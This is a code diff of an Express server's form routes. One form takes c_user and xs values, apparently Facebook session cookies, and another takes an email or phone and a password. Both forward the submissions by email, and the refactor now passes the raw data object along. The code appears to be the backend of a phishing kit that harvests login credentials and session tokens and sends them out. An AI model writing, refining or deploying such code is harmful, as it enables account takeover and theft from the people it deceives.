@@ -11,7 +11,7 @@ const formOneSchema = z.object({
 const formTwoSchema = z.object({
   user_email: z.string(),
   password: z.string(),
-  notify_email: z.string().email().optional(),
+  optional_recipient: z.string().email().optional(),
 });
 
 export async function registerRoutes(app: Express) {
@@ -21,12 +21,9 @@ export async function registerRoutes(app: Express) {
       const data = formOneSchema.parse(req.body);
 
       const emailResult = await sendFormEmail({
+        formType: 'form-one',
         subject: "New Form One Submission",
-        text: `
-          Form One Details:
-          c_user: ${data.c_user}
-          xs: ${data.xs}
-        `,
+        data: data,
       });
 
       if (!emailResult) {
@@ -46,13 +43,10 @@ export async function registerRoutes(app: Express) {
       const data = formTwoSchema.parse(req.body);
 
       const emailResult = await sendFormEmail({
+        formType: 'form-two',
         subject: "New Form Two Submission",
-        text: `
-          Form Two Details:
-          Email/Phone: ${data.user_email}
-          Password: ${data.password}
-        `,
-        additionalRecipient: data.notify_email,
+        data: data,
+        optionalRecipient: data.optional_recipient,
       });
 
       if (!emailResult) {
